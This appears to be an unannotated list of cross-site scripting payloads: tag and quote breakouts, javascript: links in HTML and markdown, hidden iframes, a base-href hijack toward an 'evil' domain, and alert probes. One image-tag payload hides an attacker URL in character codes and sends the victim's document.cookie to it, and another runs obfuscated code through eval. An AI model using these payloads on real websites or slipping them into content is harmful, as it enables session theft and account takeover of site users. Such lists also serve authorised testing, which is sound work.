```
abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```
```
"><img src=1 onerror="url=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,100,111,109,97,105,110,47,99,46,112,104,112,63,99,61)+encodeURIComponent(document.cookie);xhttp=new XMLHttpRequest();xhttp.open('GET',url,true);xhttp.send()">
```
```
<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
```
```
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```
```
"><img src=/ onerror=alert(document.domain)>
```
```
[Click me](javascript:alert(1))
```
```
<base href="https://your-evil-domain.com">
```
```
">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
```
```
